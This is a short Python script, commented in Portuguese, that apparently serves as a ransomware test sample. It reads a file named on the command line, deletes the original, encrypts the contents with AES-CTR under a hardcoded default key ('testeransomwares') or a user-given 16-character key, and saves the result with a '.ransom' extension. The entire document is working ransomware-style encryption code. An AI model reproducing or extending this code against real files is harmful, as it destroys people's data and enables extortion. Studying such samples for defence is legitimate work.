import os
import pyaes
import sys

# Defaults
key = b"testeransomwares"
ransomExtension = ".ransom"

# Possui referencia ao arquivo a ser criptografado
if (sys.argv.__len__() < 2):
    print('Você deve informar o arquivo a ser criptografado.')
    sys.exit(0)

args = sys.argv[1].strip().split(" ")

# Checa se referencia ao arquivo a ser criptografado é valida
if (not os.path.isfile(args[0])):
    print('Você deve informar o arquivo a ser criptografado.')
    sys.exit(0)

# Foi informada uma chave? Esta é válida?
if args.__len__() >= 2 and args[1].__len__() == 16:
    key = sys.argv[1].strip().split(" ")[1]
elif args.__len__() >= 2:
    print("Uma chave valida deve ter 16 caracteres de tamanho.")
    print(f"Usando a chave padrão {key}.")

input_file = args[0]

# abrir o arquivo criptografado
file_name = input_file
file = open(file_name, "rb")
file_data = file.read()
file.close()

# remover o arquivo
os.remove(file_name)

# chave de criptografia
aes = pyaes.AESModeOfOperationCTR(key)

# criptografar o arquivo
crypto_data = aes.encrypt(file_data)

# salvar o arquivo criptografado
new_file = file_name + ransomExtension
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()
